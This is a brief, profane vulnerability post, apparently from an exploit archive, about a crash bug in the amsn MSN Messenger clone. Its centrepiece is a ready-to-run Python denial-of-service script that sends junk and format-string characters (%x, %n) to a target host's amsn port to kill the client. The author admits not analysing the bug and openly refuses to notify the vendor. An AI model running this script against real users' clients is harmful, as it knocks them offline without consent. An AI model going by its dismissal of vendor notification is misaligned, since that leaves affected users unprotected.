/* Introduction */
amsn is a free open source MSN Messenger clone.

/* Technical details */
During fuzzing some instant-messaging applications, I found a basic bug in amsn.
I just sent some characters to that amsn port and noticed that it 
has reported an error and was killed. I didn't analyse the bug though. 
Maybe you're interested in doing so. :P
The following python script is enough to produce a DoS attack and kill 
the client:

---fuck off here---

import socket

HOST = 'victim.com'
PORT = 31337 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
i = 1
while i <= 3:
   s.send('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890\
          °!"§$%&/()=?`´+#-.,;:_ÄÖÜäöü%X%X%X%X%X%XXX%X%x%x%x%x%x%x%x%x%x%n%n%n\
          %n%n%n%n%n%n\³²¹³¼²[{½³]²¸\`~··')

---fuck off here---

I think it were the character '}', '{' or '%x', '%n'. Try to determine this for
yourself! Don't bug me with this shit. 
   
/* Vendor contacted? */
NO! Why should I contact them? :) lol, go away and contact them yourself.
